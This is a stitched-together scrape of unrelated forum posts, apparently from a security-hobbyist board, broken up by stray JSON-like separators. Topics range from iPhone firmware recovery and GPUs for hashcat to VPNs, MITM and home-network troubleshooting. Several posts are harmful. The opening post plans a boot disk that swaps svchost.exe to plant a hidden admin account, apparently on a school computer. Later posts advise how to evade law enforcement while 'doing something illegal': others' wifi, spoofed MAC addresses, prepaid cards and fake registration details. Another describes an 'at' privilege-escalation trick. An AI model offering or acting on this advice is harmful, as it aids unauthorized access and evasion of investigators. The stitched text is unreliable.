Then we could alter the boot.ini to load the recovery console and run a batch file (or whatever) that switched out the svcehost.exe with celltoolz hacked version while backing up the real version at the same time.  Then the batch file tells it to shut down the system eject the CD and reboot to winXP.  According to what celltoolz says the hacked svchost.exe will create the new user and pass with admin rights and force the WinXP OS to reboot and backup the original svchost.exe file.\nI imagine it working like the Ophcrack live cd that just launches and runs the brute force on the dumped SAM, SYSTEM and SECURITY hashes and keys.  Then gives you the user and pass for everything stored on the local PC. (yes that's an over simplification)\nWhat do you guys think?

So could this work?  I'm willing to supply the final product cause I have the toolz and I want to contribute.\nJust give me the word (and maybe the .bat file, and possibly the hacked boot.ini file, if you have the spare time and brain) and I can have the iso set up and tested ASAP.\nHope this helps.\nBTW - We could also integrate this into a USB drive to boot from for low visibility.\n", "\n\nSince you are only placing the new user to the local admin group via the SAM, SYSTEM and SECURITY files, the networked user and pass for the schools LAN won't matter.

Personally, I think the idea of a master vault, is the wrong approach with respect to things like passwords and sensitive materials. Tavis Ormandy for example, has a habit of breaking password managers, mainly to help make them more secure, but nothing is beyond the end user to mess up somewhere, even when using password managers, and this only controls one facet of security from login using a password, where logging in on a system might be bypassed altogether, the vault is only safeguarding one part of the equation. Also, if someone guesses the password without using exploits to access a password manager, there isn't anything you can do to fix that issue once it's discovered, since it's not a flaw, just a weak master password.\n\n\n\tThat said, I think a multi-layered approach, and if required to use \u00a0password vault, more than one vault kept in different locations with separate password categories in each is a better idea. If that means as simple as an encrypted archive stored remotely or on other hardware separate from your local everyday workstation, then so be it. Add in a Yubi key to the mix, more layers. The more the better, but I can almost guarantee, no one here is doing 100% best practices at all times. We're human, and we screw up all the time.\n\n\n\tIdeally, you'd memorize them, but we all know that isn't always possible, as well as not always our choice when system passwords are sometimes setup for us in advance. Safeguarding passwords at the end of the day is as much about self diligence as it is how to store them securely, because if you can't keep your passwords or data safe without a password vault, chances are there are other things you need to look into securing as well.\n\n\n\tBest password manager? The one you've kept out of public hands at all times and with no access from anyone other than yourself, which goes to say, vault or no vault, no one should know where or what your passwords are stored in, including advertising what you use here.\n\n\n\t\u00a0\n\n", "\nAnd thats relative to an iPhone user account recovery from a factory wipe?\nAs far as I know, after a wipe, you use iTunes to set it up like new out of the box but you need to use a firmware that restores it to original settings out of the box.

I had to unbrick my nieces iPhone 3(I know, it was old, but was given to her by someone that her pre-paid sim worked in and not really the point...) \n\nAnyway, she tried iTunes 11 to update it, and it locked the phone out so you couldn't even get it out of DFU or Restore mode, since it tried to put firmware on it that couldn't even fit on the space of the phone. I ended up in the end, having to find a copy of iTunes 10 and used another tool I forget the name of, I think called iReb, which lets you force compatible IPSW firmwares on them(which can be found on the link above) and resets the phone to working condition, then wiping it, but also putting it back like out of the box by using an older firmware, not the latest iOS 7. It had tools I think to let you set it up for any new account, but not sure if that will work with iOS 7 based phones, so I would try to downgrade it first using previous firmware for the same model phone which should run on it, create an account via iTunes, and then once created, update to iOS 7 update through iTunes AFTER getting the new account onto the phone, which might work. Either that, or take it to someplace like Verizon if you know anyone that works there and they should be able to do it. The Apple stores, are usually less than helpful for some reason. We took the same iPhone 3 to an Apple store, and they told us it was impossible to restore it, yet I managed to do it using an XP VM, iTunes 10 and iREB with firmware off http://theiphonewiki.com/wiki/Firmware page and she had full funtionality of the phone. Only thing I did afterwards, was disable safari and told her never to go online, since there were so many hacks for it and no patches for that specific phone model since they discontinued updates for its firmware, she used it for talk, text, photos and music. \n\nI'm not 100% sure, but I think I grabbed iTunes 10 off http://www.oldapps.com/itunes.php although, there are probably other sites that may have it as well. \n", "\nActually, you can downgrade/fix/reinstall, if you have the CORRECT firmware, AND an older version of iTunes for the last available update to your phone, which there are sites that host both older iTunes and firmware for phones all the way back to the first iPhones.

In putting open firmware on there that gets a device up and running from a failure or other such issues, then downgrading to older firmware, you may be able to put factory images on it from the iPhone wiki site once you get it jailbroken and running. The iPhone wiki has all the firmware releases on their site but as mentioned, signed versions may be a PITA to fix but shouldn't be impossible. I would think in putting even a hacked firmware from a different site on there that unlocked everything(although I can't actually confirm without comparing from Apple and iPhone wiki the MD5 hash of files being the same from their site being any safer) you should still be able to then rollback and wipe that firmware to where you want to be.\n\nI would think as long as the iPhone wiki site has been around someone would have vetted the images by now if they were doing anything nasty though. \n", "\n\nIf we always believe what apple says, there would be no jailbreaks or ways for tech companies to fix stuff for products people bring them. not saying certian IOS updates don't cause phones to crap out, but I've yet to see one that couldn't be fixed. I've only had to do a few and my wife has actually done more apple devices than I have, but all the tuts I've found online have worked, whether using redboot tools or the like or just loading dfu mode and firmware files from the iphone wiki. there are probably ways to otg boot the phones and wipe them as well, although I don't own an otg cable or know how you go about it, would make sense to recover data, forensics would have a means to access the devices.\n", "\n\n\n\tOk.\n\n\n\n\t\tQuote\n\t\n\n\n\t\t\tWe use a firewall called IBoss\n\t\t\n\n\n\n\tWho is \"we\"?

In most general cases, a CUDA based card is a good investment for Linux based systems that have driver support, just make sure it's on the hashcat site as both compatible with your OS\u00a0and in the range you want for cracking to money value. AMD's cards in many cases, while not always best for gaming, have been known to be better math crunchers and outperforming the CUDA cards for less money, so pick your poison, but do the research on everything from your OS, CPU, and Mobo combination that will work best with your GPU.

This is why the research must be done for the main features and budget needs, and comparing GPU's with different mobos too, as some boards work better on different hardware with different CPU setups and PCI-e bus lane capabilities. I'v had cards in the past, that didn't even fit in machines due to the size of the mobo components and case, so unless you're building from scratch, these are all things to think about with respect to your purchase.

I'm an AMD CPU guy for my desktops, saves money, and I don't need the most expensive high end stuff. Choose what you need and what fits your budget, whichever preference you have for Intel or AMD CPU's which will also determine the motherboard. If you've built your own machine before, this should be something you figure out quickly with the specs that meet what you want including expandability, future proofing as much as possible, etc. Many things are outdated soon as you build it, so chasing hardware is not something I like to do and try to go with what meets my needs, but also max out things like memory and available drive space, cooling needs, etc. \\\n\n\n\tMy current machine is little more than a year old, but also doesn't have a 3.0 PCIE board, and is already outdated.

People already do this for firewalls and some home wifi routers. Darren has covered it in 1 or 2 episodes now, and it's probably for the better if the direction of routers for the hobbyists go it alone. I think this will drive innovation and more open source projects as a result. The FCC doing this will have a hydra effect and just cause even more attacks on home routers to find holes in them, while people who are tech savvy will explore more options with their own home made devices.\n", "\n\nFor things like the older linksys USB wifi cards, you used to be able to go into the windows registry to change the channels it could lock on to, which in the US, we have 1-11 and the card could actually do all 1-14 for the 2.4ghz range while most of the rest of the world could do 1-14 by default. Linux let you access this just from the terminal. Thing is, like you said, the FCC would be locking things down but the rest of the civilized world wouldn't really have to abide so hardware would need to be able to use things like the higher channels on the older cards, which were really just a setting to disable accessing them. With Firmware being the main thing controlling the functions (at least in what the FCC now wants control of) I would say they probably end up doing something similar, which is more security through obscurity, or, remove feature X from US shipped devices with modified configurations, while EU and Asian based versions of the same are probably no different inside hardware wise, only sans the lock down.\nI can understand regulation for communication standards and conformity in user space alongside commercial and gov/mil radio space, but with SDR now being more accessible, I think it's only going to go further to make things difficult for regulations to keep a lock down on things people want to be able to do with their devices, and modding firmware, will become the least of their worries in the long run.\nWifi is everywhere, and as much as I hate it(it's inherently insecure and a PITA to keep stable in some environments) it's not going away any time soon. My system is on 5GHZ using 802.11AC, which does 802.11, a B, G, N and AC using 3 radios, and I get 350+mbps at one end of the house to the other. They make firmware for my router that I could do a lot more with and probably add more functionality to the firewall rules, which these things are basically small linux machines with some radios in them. I think any regulation that tries to lock down the master and client devices, is still going to impact peoples want and need to add things to their devices, like SSH and VPN logins that aren't enabled by default on many devices but are capable.

Why exactly the FCC wants control, who knows. Most of the time it's for money and misguided bullshit that has no relevance to their department, like how they used to sue Howard Stern till he left terrestrial radio for vulgar language. Other than having working standards for communications, anything else they do beyond that is pretty much bullshit. Make devices work inter-operable with safe standards, but beyond that, they need to be hands off the hobbyists and tech community. Especially if we're finding flaws and releasing patches, which is probably more the covert reason they want things untouched, since the govt is probably in some way putting their hands on what goes into US shipped devices anyway.\nhttps://www.google.com/#q=NSA+router+firmware+backdoors\n", "\n@cooper, I agree with you on all those points except maybe the FCC Free speech thing - https://www.google.com/#q=fcc+vs+free+speech\n\u200b\nhttps://en.wikipedia.org/wiki/Federal_Communications_Commission_fines_of_The_Howard_Stern_Show\nOne of the reasons Howard Stern left terrestrial radio was because of the fines levied against him by the FCC.\nThe FCC was created, or superseded the FRC, which at the time only covered AM and personal radio users and wasn't a huge market as it is today. With the onset of Fm radio and television, the FCC extended there reach into pretty much all communications, wired and wireless, for modernizing radio and wire telecommunications and monitoring of stations and end users(ie: ham and such radio users), with what they can say, and in today's world, often blurs over into net neutrality waters, but was not designed for censorship on any of these, which makes up a large amount of what they have their hands in here today in the US and North America. The main thing was keeping people from squashing other bands and frequencies so all things played nice together, so that microwave oven, within reason, didn't knock out a nearby government radio antenna or military transmissions. They've taken an over reaching hand into what can be put on the air though, and what we transmit publicly, which sure, context is important, but free speech doesn't exist in the form of communications monitored by the FCC. If they deem it to be derogatory and offensive, with enough complaints, will go after you and fine you if not shut you down, even when within your rights to transmit on a frequency or medium you own or have right to use.

Only problem I see with this, how do you accept payment for these routers and how do you ship them. Ideally if you had control over other routers and were logging in remotely from free wifi hotspots you get two benefits. one, free hotspot use for the normal anonymity profile persona you use, while 2, having access to a large chained network of routers that are deployed which you can use for whatever you want to route a set of tunnels through. This is all cyberpunk in theory more than reality since you'd have to plan this out and have the money for the mass deployment, but I don't doubt to some extent this is in part why governments intercept devices in route to companies so they can backdoor them and get in where they want, only in this case, we'd be using them for access control to our own tunneled WAN mesh of affected devices.\n", "\n\nConversely, the more data, the more noise. if you are hopping through different nodes you own which all have user traffic on the same routers, then the investigators need to be able to differentiate between home users and your use.

TOR is great for oppressed people in countries where the government censors and blocks access to freedom of speech, access to world news and communications. But at the same time, our Navy, who in part developed TOR, in some respects probably knew full well what would be in store and how it would get used. Our government has things in place, for example, lets say your site is perfectly legal, never committed a crime. But if they seize your host companies servers in connection with anything, they legally have access to your data and servers too.\nExample, dropbox. Cloud based storage. They don't need to ask drop box for access to your account. All they have to do, is charge Dropbox with something, they can view anyones files in the mean time, since it would then fall under their jurisdiction. So they catch wind of a TOR exit node that passed child porn, most likely something they themselves put out there to catch pedophiles(they've done it numerous times in the past), and they want to catch the end users, they don't go after the end user, they seize the exit node, take your stuff, and then turn it all back on at their site, and just collect the illicit users, using your boxen as Mr. Honeypot.\nIs it right? No. Is it fair, no. Is it legal? Yes, and that in part is why we have to work with people like the EFF to help protect us from being accessories in crimes we have no control over. You freely let anyone use your IP space to do whatever you want, you in part take on some responsibility for what is transfered over that network, and child porn, while you may have no knowledge of the transmitted data, is in part something they will come after you for, regardless. But there in lies the catch 22, how do you know, someone didn't intentionally do this over your exit node, to come after you. Much of TOR comes back as unknown country, and non traceable in some parts of the world, depending on how you set it up, but if you are allowing TOR from your home ISP, without running it over a VPN or Additional Tunnel services, your IP still is your IP. The user is much safer since the trail of bits leads back to your exit node, but if you don't take steps to encrypt and tunnel the TOR traffic in general, then your home IP is the first place they will go to get the data they want.\nToo many people abuse TOR, and child porn, while horrible and exploitive in nature, is the least of the governments worries with respect to accessing peoples data.

Just look at the latest Amazon integrated search put in uBuntu and the backpedaling they did as if it wasn't their intention to share your local searches with 3rd parties.\n\nThe more popular something becomes, the more it will be attacked, just like OSX is no longer the \"safe\" OS people always thought it was, if anything, its got more holes than swiss cheese these days and its just that people haven't taken the time to focus on it as much, but times are changing and so is the focus on who and what gets attacked these days.\n", "\nAre we talking stereotypes of \"Chinese people\" in general or state sponsored \"Chinese government espionage\" which is what I think most of us have a concern over. For me, its not about race, its about the actions of a specific group involved, and that could be any group. The word \"Chinese\" in this thread may be taken out of context, and for that i think some clarity needs to be put into perspective. I think there a PLENTY of brilliant Chinese coders, most of whom could run circles around the rest of us here on the forums. I think the general consensus on this thread though, is on the \"Chinese government\" as an entity and world wide player who has a history of not only stealing trade secrets, but intentionally back-dooring hardware, software, and is one of the largest offenders when it comes to state sponsored cyber attacks.\nNot saying we, the United States aren't in some manner doing much the same thing in spying on the world, but as far as coding and inserting reliable trusted code into open source repositories, I think all governments should stay out, while its left to the open source community at large, so for me, this is more about true openness and transparency, and less about the stereotype of the word \"Chinese\". You could substitute it with \"insert any other country name here\" and I think most would have some of the same fears. Does that make sense?\n", "\nUm, get a router, and sit behind NAT? If you have access to the ISP's local subnet to see all customer traffic, thats a problem with the ISP, not so much networking. Comcast has this issue on Business lines but their residential lines don't usually exhibit the same issues. If this truly is a problem, with the ISP you are on, invest in a VPN services in your area.\n", "\nEither buy VPN access, which for me, is like $7/month so thats really cheap, or just register a domain that has shell access, and SSH tunnel, which costs about $120/year. Nice thing about the websites though, is storage to share files, that don't rely on exposing my PC to the internet as a file server. Some hosting accounts also have VPN access as well, depending on who you go with, so there are a combination of ways around things. I have both a VPN and hosting with different people though, and can SSh through the VPN as well, so kind of double layer if I need to, but SSh tunneling over your site can tend to be slower than dedicated VPN access. I can get faster speeds for most things, over my VPN than I can without it, due to how close I live to my VPN host and my ISP caps my upload speeds, but under the VPN, they tend to be faster due to how close I am to it. I just like the VPN service for safeguarding my home IP as well, so its also a security precaution to some extent. \n", "\nThing to understand about ARP attacks, they happen at Layer 2 and 3, and require access to your local LAN. You can't ARP poison and MITM a home PC, from the internet using ARP(although you may be able to write something to do it at an IPv6 level, since you're somewhat  statically linked to your IPv6 address and hardware ID)\nIf you are behind NAT like a router -> modem -> ISP, you can't be ARP MITM'ed on your LAN, unless they are ON your lan, which if they are, then you have bigger issues at hand.\nYou CAN however MITM layer 3 with other tools, that happen OUTSIDE the LAN, with things like SSL strip and some other stuff, so long as you control the router or routing path/DNS the user uses, and you can force them to route through you to the internet at large per say.This requires them to be able to force all your external traffic to run through one of their machines though, and that means DNS poisoning and control of your routing/route setup, which most likely would require a local side exploit first to set this up plus control of your router/firewall/gateway box to set that up.\n As far as I know though, even tools like this: http://mitmproxy.org/ still require local LAN access for this type of MITM attack.\n", "\n\nIf its an all-in-one modem/router/wifi AP, then yes, most likely that can happen(and does), but with normal routers and modems, stand along modems that aren't also routers and access points, under normal circumstances, can't be accessed by the consumer, other than to see the Diagnostic page at 192.168.100.1 and the only people that should be able to access the modem itself, is the ISP which requires a CMTS. If however, its a dual device, that is also a router, and has remote admin capabilities, then you're foobared if say, you can't access or disable the remote management interface or the ISP locks you out of it. This is why I buy my own modems and routers. You can, jtag a modem and put your own firmware on them to lock out even the ISP from making changes, and also put on other configs, but its also illegal in the US and you can go to jail if you get caught. I have a Linksys sitting in a box that I've been meaning to unbrick because of Comcast applying failed fimrware updates to it and older firmware revisions than what it shipped with, but I haven't had the time to crack it open and solder on the jtag cable nor mess with any of the software to reprogram it. I used to do a lot of reading up on the sbhacker forums, and initially was going to do it to my surfboard when I bought it, but figured since it was new, i would just try fixing the older linksys. The Sufrboard is Docsis 3, so I get the bonded channels and faster speeds anyway, so no need to really mess with it, but the Linksys is Docsis 2.0, but was faster new, out of the box, than speeds I get now due to applied configs by the ISP and firmware changes that throttle my connection.\n", "\nOpenVPN client and a config file for your VPN service and you're good to go if you choose a VPN that uses OpenVPN.

If you are looking for 100% security, you're in the wrong field. Its a term, that does not have the same meaning with respect to computers as what it is defined in the dictionary.

I use a throw a way password for the forums thats not tied to any other sites, so if anyone every did get my password, won't do them much good other than posting spam as me on he forums and not like we haven't been popped a few times over the years.\nSafe web practices, securing your own traffic, and connecting from safe locations or even VPN'ing all your traffic to here, would be just as effective as having SSL on the site if your take measures to encrypt your traffic on your own. Connecting from the local coffee shop, SSl or not, is not safe anyway, and SSl strip and several other tools could be used to intercept your session, so tunnels and/or VPN's, and layers of your own security are in the hands of the user.\n\nThanks for awesome suggestions on how to deter sniffers and ISP intrusion.

My friends and I are re-researching just how secure SSL actually is and why certificate authorities such as Verisign Inc. deliberately avoid government agencies and security researchers from enforcing standards.

We're not living in third world communist/fascist emirate of Mars..... just my two cents....Stay tuned....\n@logicalconfusion if I didn't know any better, I'd say there was some pent up frustration and even a bit of a swipe at the cast there.

Everything posted is in the clear on the forums to begin with, and if at a cafe, you should be using an SSH tunnel or VPN to encrypt all your traffic anyway. I use one from home as it is.\n\nThe swipe was two fold though, joking aside, having met Darren, Shannon and Paul, they are some of the nicest people, but also much smarter than you might think. Darren could probably run circles around half the people here whether anyone believes that or not and deserves much respect. He gave up duties of web hosting and controlling all of this side of things a long time ago when they went to rev3 so he could wear one hat, and that was of show host, so much of this is not even his area of work any more, as where back in the day, he had a regular day job, ran the show, site, hosting, etc, you name it, with the help of the cast.\n\nGetting back to the swipe, one was at Darren for the leet haxor remark, not so much the gotee thing, the other was at Shannon, where some might look at the pineapple remark as a reference to her anatomy, which even if that was clearly not intended, could be read that way. Some back history I don't want to drudge up, but lets just say there were some nasty attacks against her in the past and reading your remarks, having been here as long as I have, seemed almost too close to reference something from long ago that does not bear repeating, but seemed quite like it was a definite hit on the sentiment of said subject.\n\nStill, SSL might be nice for logins, but again, we're not selling or taking credit cards, and everything you put on these forums, is public anyway.

Then, sign up with a site that has shell access or even better, VPN access and even the capabilities to set up TOR exits. Using the pre-paid visa gift card, pay for all the services to get up and running. Then use either an SSH tunnel off of this site to encrypt all your traffic, possibly between multiple SSH tunnels, or add it as a TOR exit node, or if it has VPN capabilities to mask your IP, use it with TOR through the VPN itself. The trick here, is when using this setup, NEVER use it from your home, and NEVER log on to any website tied to your real identity(twitter, gmail, etc) and never let anyone else know, that you use a service like this. You would also need internet access from a location that to some extent, conceals your actions as well, whether it be open wifi hot spots, hotels, etc, you will want to be able to reach networks without having to physically be near them or in the public view. You will also want to spoof your MAC address on each use, in the event they trace it back to the physical location, you keep them on their toes.\nNothing is full proof, and it someone spends the time, money and resources, they will track you down at some point.

If you own a device like an ipad or touchpad, or mobile phone that uses wireless, use google's location service and be surprised what it shows. From my touchpad, using bing maps and the google api, it shows me within a few feet of where I am, or more correctly, where my wireless router is. No IP lookup, but wireless device triangulation. I wouldn't expect to use a 3G access point as my cover with any regard to security. Especially if I had it with me, moving from place to place, it just makes it that much easier for them to track you.\n", "\n\nI think it depends on where you are with it and how you use it, but I wouldn't bet on being secure with it alone like its an ace in the hole. Especially if you move place to place with the 3g device while its on, with enough signal and time tracking it, law enforcement would be able to find you. They could contact the phone company who's service you connect over, and shut you down leaving the 3G device disabled to the itnernet, but still track it, or just intercept your traffic and sniff everything you do on the 3G connection. \nThink about what you are saying, regardless of triangulation, you are using the cell companies towers, which they can track which towers you are near and have connected to, and law enforcement can get a warrant to sniff your connection, or even force you to 2g vs 3g (since most devices will fall back or drop down to 2g for compatibility modes), which they can then remove 3G encryption and see all your traffic in the clear(although I am nto 100% sure on this with 3G modems, I do believe it works that way with cell phones, which 2G encryption is known to be broken to quote Georgia Weidman). \nNow, you might tunnel your traffic over TOR or VPN via the 3g connection, but they can see the end points and still have control of the 3G network, and at some point figure this stuff out, or deny access to those networks or just deny you internet access all together. Same with wifi, but at least with wifi, when you leave a location and turn off your device, the connection doesn't leave with you, as where with 3g next time you turn it back on, \"oh look, its on the other side of town now\". They would be able to track your movements and eventually find you. Same with Wifi, but I think with wifi would be a tad harder, so long as you don't use the same places to connect from all the time, and don't leave identifying clues/trails when going online that pinpoint you as the same culprit each time. Hacking over 3G, leaves a consistent point of return every time to come back to when investigating.\n", "\n\nI would never suggest using a landline, assuming you mean dial up or wired connection from your home or someone elses. I was saying, only use wifi exclusively, and not from your own network. If you are doing something illegal, then might as well do it on someone else's wifi, and not anywhere near where you live, but more from on the road like cafe's/hot spots, libraries, hotels, airports, etc. Connecting wirelessly gives you some anonymity as where 3G ties you to that same 3G device every time due to how the device works and identifies itself, just from different locations you decide to turn it on. With 3G, it follows you on the physical device everywhere you use it and from my perspective, gives too much of a trail to leave behind if its associated with a hacking event. If done over wifi with spoofed mac address every time, you tie it first to the access points you use, then back to you, so if you continually hop networks, with spoofed mac addresses each time, its that much harder to say its the same person they are trying to track down.\nBy the way, 50 meters is only 164 feet.

I know you can do it for windows, but for me, it would make sense to scan the disk while not running OSX, so you can work without anything blocking you and scan for malware. Either that, or backup your important info, and nuke the MAC system, start fresh just to be safe.\nHere is another thing to look into though. If the Modem is wireless and you already have another router, do you need the Verizon wireless modem part on as well? Disable the wireless on the modem, see what happens with speeds. If they still go funky, something else might be amiss, but I think we are still somewhat in the dark on everything. This is why I asked for a topology of your network. How they are linked together, what each device does(wifi vs wired or both), and what setup is on each router, such as do you allow 802.11B in the mix, which if so, will automatically slow down any wireless if one of the devices is using B. Disable b and only use G or N if capable on other devices. Also, make sure no interference is causing network trouble, both with the wireless and the wired setups. Make sure to use proper Cat5e or Cat6 cables and not running over any electrical outlets or near noisy electrical devices, power chords, etc. There are so many things that can slow down a network, it might not be any of the hardware, but more in the setup, configuration, or even wiring or wifi interference. A cordless phone for example sitting near the router for example or more than one wireless device on the same channel as yours nearby. I'm not convinced its malware either, but you never know.\nOne thing you can try though, is add OpenDNS to your routers and hard code in your workstations, just one more layer to tie down that might help eliminate DNS hijacking/hacking just in case. Make sure all wireless is on at least WPA2, and if not needed, disable the wifi on the router(s) all together.\n", "\n\nDo you have admin access on the Fios router? Log on and take a look at the network settings. Make sure they don't have some weird MTU set, or QOS settings interfering. Also, depending on the model, many of the old Fios Actiontec routers, had a backdoor admin port. Newere ones are locked down now, but the old ones had pre-set, standard passwords, and if someone got in over wireless, they could definitely be leaching off your modem. Most of the Fios router/modem combos are 10/100/1000 too, so you shouldn't be seeing slow speeds unless you got faulty cables, or the router itself is misconfigured in some manner, or been hacked, like DNS hijacking. This is going back a few years too, so hopefully you don't have one of these that got whacked - http://www.ozzu.com/hardware/verizon-fios-actiontec-router-vulnerabilities-t100925.html\nIs the WPA2 password on their modem/router set by Verizon, or yourself? If they set the password, logon or reset the device and change it to your own password. And I agree on the double router, having two NAT can be an issue with speeds, but I would take advantage of havine the ability of two separate subnets instead of bridging them, just for sake of separating two wireless lans but if its not needed, disable wireless on the second or first device, preferably on the first device in line and also disable WIPS on both wireless devices, as well as uPnP.\n", "\nIf you think a machine has been compromised, don't waste time trying to get someone to fix it. You would be better off wiping it and reinstalling fresh. More than likely, thats all a local shop would do, and they would charge you for it when you could do it yourself. What you should do though, is MITM the traffic and see where the data is truly going. Look up the IP addresses of the places you think FireFox and your Email is connecting to. \nYou could even just run Wireshark locally on the machine you think is infected. Just run it while no other programs are open and let it run for a while. If it is something nefarious happening, and you have no other internet programs running, you should start to see some traffic. I imagine most of it will just be ARP and SMB stuff, but if you see anything going to the outside internet, log all of it and upload somewhere so that we can take a look at the pcap file to see if it truly is malicious, or just normal traffic.\n", "\n114mb pcap..lol. Good stuff. However, nto sure how you created, but I can't open it in wireshark or networkminer.\nFrom the looks of it, almost everything in there is you on google or microsoft(update probably). I can only get so far down in the file though and it craps out on me. 114MB is bit large for a text doc, but if it was in a normal pcap format, wireshark shouldn't have any issue opening it. Did you by chance use tcpdump to create this? Seems like its truncating the data, and just showing small portion of it.\nedit:\nI see 1712 entries for \"169.254.1.165\" and 1350 for the broadcast \"169.254.1.255\" which makes it seem like you have DHCP issues, or you are disconnecting and reconnecting to get on/off the router(like starting or stopping the NIC). 169.254.x.x is an APIPA address, which means its internal only and can't reach the internet. Your machine will usually assign itself an address in this range when it can't reach a DHCP server to get a valid lease.\nBy the way, when I mentioned this before, I meant let it run, without visiting sites, or doing anything, so any traffic generated by something malicious on the system, would be easier to see. Right now I'm filtering you visiting msdn blogs, google and the live.com, etc\nI didn't see anything malicious looking in it. Roku seems to be doing SSDP stuff though, and generally its best to disable this on the router, as you can gain info form the via the interet with specially crafted packets. In general, disable uPnP and SSDP.\n", "\nI'm not seeing anything malicious in there.\n17.151.16.12  is time.apple.com, and is your MAC doing a time of day check via NTP (network time protocol) and syncing its clock.

Looks like normal traffic from your workstations. If you seem to have network issues a lot, try setting a static, or DHCP reserved address for your ROKU box, and see if that helps alleviate anything. Also, set your DHCP lease time to a higher interval on the router if possible. I don't own the equipment you are using, so I don't know all of the available options but I would say if all else fails, reset the device to default settings, and then begin to lock it down, disabling remote administration, disabling uPnP and SSDP, and then tweaking your DHCP settings. Might even be misconfiguration on the desktop systems themselves, but whatever firewall software you are using that says its seeing attempts to go outbound, more than likely they are normal things, like Apple NTP and both apple and windows software update checks. \nIf really paranoid, hard code OpenDNS into the routers and on each OS, ensure you aren't getting DNS hijakced and monitor this a bit more, dig into the captures and learn whats really going on. The ROKU might be eating up your bandwidth or causing issues with the network. Ensure each IP you see on the logs, like when you see an ARP, is related to each of your home network devices MAC addresses, and if any MAC address seems unknown to any of your devices, hunt that one down, or block it on the router. You can also whitelist only your known devices via MAC address filtering if your router has this option. Helps keep wifi leaches off the router(so long as they aren't cloning your other wifi devices MAC addresses, which can be spoofed).\nFor speed tests, unplug or disable your Roku for a while and from each machine go to http://www.speakeasy.net/speedtest/ and click on locations cosest to you. Do this a few times on each machine. Then, plug in the Roku, watch some movies or TV, and try running the tests again, see what happens to the bandwidth. If they all seem relatively the same while the Roku is in use, then I'd say its not an issue. Also run these tests with wifi disabled and enabled, and using different connection scenarios, see if the wifi side is slower or rest of network is slower when wifi is enabled. You could be getting DoS'ed by someone trying to do a Reaver attack for WPS pin.\n", "\nPersonally, email is more or less broken anyway. Sending email can be spoofed from nearly anywhere, phpSendmail function for example on a compromised host and you can create fake email sall day long. There are still smtp relays out there that don't block anonymous connections sending over port 25. \nAs for receiving, that would be the hard part if you truly want to stay anonymous. About the only ways I could think of is 1 - always use some internet connection other than your own and away from your home (ie: coffee shop, library, open wifi, hotel, etc) 2 - Register with any free email service while in a live environment and with mac address spoofed. Then when you need to receive email, you have to always be on someone else's connection to login to the services. \nHotmail, Gmail and Yahoo mail are anonymous for the most part. Not saying Google and the others don't have their claws and fangs deep into everything you do, but you could easily work around these things with clean systems that leave no tracks, ie: netbooks/laptops with with no HDD and only booting off cd/dvd media, no stored data other than while you are logged in and running, and always spoofing your mac address. Even adding to this a socks proxy from another country or TOR to access these email accounts. Granted proxies and TOR can be sniffed, but if you are doing something this shady to begin with, the email accounts should be disposable throw away accounts to begin with, 1 time use sort of things. Anything used more than that, could eventually be tracked. Especially if you login regularly at roughly the same time intervals. \nAnother thought, and I don't know if this would work or not, is register a domain with a pre-paid Visa Check, use fake info for everything, all while using the above methods to mask your location and mac address(no hosting needed, just DNS/Domain Name services and forwarding capabilities to your own servers), then set up DNS forwarding on this to a DYNdns service, and use your own machine as a mail server. Only issue with this, is you can only get email, when connected somewhere, so people can only send back and forth to you when you are online and the machine is running. If trying while the machine is offline the emails will get returned or just error out with mailer daemon not found.\n", "\nAnything that is pay for, is trackable for the most part. If you had someone get you pre-paid Visa checkcards, then maybe that would work, but the whole point, is to not have any real physical ties to be identifiable.\n", "\n\nOne thing to try staying anonymous, quite another to break the law though. I don't think creating sites anonymously with pre-paid cards would really warrant jail time vs compromising a whole slew of machines which 1, could get you caught, and 2 is most definitely breaking the law. I joked about using bot-nets in another thread, but it was just that, a joke, poking fun at the OP's question.\n", "\n\nYeah, but there in lies the catch 22. Contact with any other person, website, etc, makes you trackable. This is something you do on your own, with no other involvement from others. If people know you help you set up your email, that removes the anonymity. Thats kind of the funny thing about Anonymous and LulzSec.

I was fixing a computer for someone, when I ran into some issues. In XP Home edition, you don't have access to other users files and can't set ownership like you can in XP Pro. Trying to view another persons documents is blocked. On top of that, I was installing some firewall and anti-virus software, which worked fine on the main acocunt I installed it on, but when you would then login as another user, the firewall would crash under the other user accounts and then you couldn't run any programs, getting an error \"can not find the path or file\". \n\nSo then I tried installing it under each user. That didn't work, because it said I didn't have rights to access the firewall install from the main account I installed it from, so I couldn't uninstall or repair it under other users. Then, it started giving me issue with deleting files, saying I didn't have permission to do so, which was a problem because at some point, I couldn't evne uninstall the firewall or delete its folder and clean the registry to fix the install.\n\nIn short, I used the \"at\" trick to make myself the \"system\" user. Once I did that, I could uninstall all the crap that was on there, and delete the corrupted files it wouldn't give me access to before. Then, I reinstalled the firewall as \"system\" and once I rebooted, ALL the other accounts worked fine and nothing was crashing or locking up. \n\nHad I not remembered this little trick, I probably wouldn't have been able to fix those problems short of a backup and reinstall of the OS, which was not something I wanted to spend my day doing, nr have to set up each users programs, etc. Things were really fubared until I was able to have access to the system with full privledges in order to delete and install what I needed. \n\nProps to the sorrow or whoever originally discovered this trick, it came in handy.

This \"AT\" command trick not only worked, but unlocked a  lot of things as well, so say you were a domain controller, but not logged in as the domain admin, but someone of lesser privledge for dumb things like resetting passwords or whatever the case may be, you effectively become \"system\", when explorer.exe respawns, you get the configure your server wizard and can then do any function regardless of what your previous system level administration access was.\n\nStill tryign to get something similar to this working on Vista. Figured out how to enable administrator on vista, so you dont have to use runas and authenticate when trying to use elevated privledges, but does require you to use the runas command to enable the feature.

Set cacls so that users can not access or change other users directories and files. Then if one account gets hosed or malware, create a new account with access rights to the old acocunts files, copy over what you want to keep(don;t run anything until verified clean though) and then delete the old account. Then you don't have to spend all day backing up, formatting, reinstalling the machine. In a corporate environment, its great to just grab a a disk image and reinstall quickly from your last backup, but when a home user has a whole family of people using the same desktop machine or laptop, you would need to backup each users files, then format, reinstall, recreate each user, and restore each users files. Thats just a pain in the ass. \n\nIf you can create a new account on a machine that is free of malware and such, copy over your important files, then delete the old account off the machine. That is the quickest fix I can think of, but this only works if the malware was not able to compromise the admin account on the machine. If it hosed the admin account, then you could use a bootable pe and create a new user that way, and do the same thing, having a clean account, copy over the files you need and delete all the f*ked accounts from the box.

